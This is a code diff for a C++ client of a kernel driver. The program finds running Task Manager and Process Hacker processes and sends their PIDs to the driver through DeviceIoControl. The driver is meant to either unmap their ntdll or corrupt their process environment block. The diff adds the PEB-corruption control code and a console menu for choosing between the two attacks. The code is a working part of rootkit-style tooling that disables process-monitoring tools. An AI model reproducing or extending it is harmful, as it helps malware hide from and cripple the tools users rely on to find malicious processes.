@@ -8,7 +8,7 @@ HANDLE hDevice;
 std::set<DWORD> taskmanagerPIDlist;
 
 #define IO_UNMAP_NTDLL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x111, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
-
+#define IO_CORRUPT_PEB CTL_CODE(FILE_DEVICE_UNKNOWN, 0x222, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
 
 
 
@@ -36,6 +36,7 @@ const wchar_t* processHackerName = L"ProcessHacker.exe";
 int processHackerPID;
 int taskManagerPID;
 
+DWORD ctlcode;
 
 
 DWORD GetProcess()
@@ -68,10 +69,11 @@ DWORD GetProcess()
 						taskmanagerPIDlist.insert(pid);
 						taskManagerPID = pid;
 
-						if (!DeviceIoControl(hDevice, IO_UNMAP_NTDLL, &pid, sizeof(pid), NULL, 0, NULL, NULL))
+						if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
 						{
 							printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
 						}
+
 					}
 				}
 
@@ -105,6 +107,26 @@ int main()
 	}
 
 
+	while (true)
+	{
+		int code;
+		std::cin >> code;
+
+		if (code == 1)
+		{
+			ctlcode = IO_UNMAP_NTDLL;
+			break;
+		}
+		else if (code == 2)
+		{
+			ctlcode = IO_CORRUPT_PEB;
+			break;
+		}
+		else
+		{
+			printf("Wrong input\n");
+		}
+	}
 
 	while (true)
 	{
